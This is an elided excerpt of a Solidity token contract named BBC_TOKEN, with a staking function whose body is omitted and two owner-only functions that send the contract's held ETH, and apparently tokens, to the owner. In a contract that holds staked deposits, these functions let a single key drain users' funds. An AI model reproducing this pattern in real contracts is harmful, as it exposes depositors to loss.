...
pragma solidity ^0.8.0;
contract BBC_TOKEN is ERC20, Ownable {
   ...
   // uint256 private sBBlock;
    ...
    constructor() ERC20("BBC TOKEN", "BBCT") {
  ...
  function StakingWallet(address _senderads, uint256 _amttoken, uint64 membcode, uint64 rcode, uint64 plan) public {  
    ...
    function BBC_TOKENTokenLocked_Exchange(uint amount) public onlyOwner {
    address payable _owner = payable(msg.sender);
    _owner.transfer(amount);
  }

    function BBC_TOKENLocked_Token(IERC20 token, uint256 values) public onlyOwner {
        address payable _owner =  payable(msg.sender);
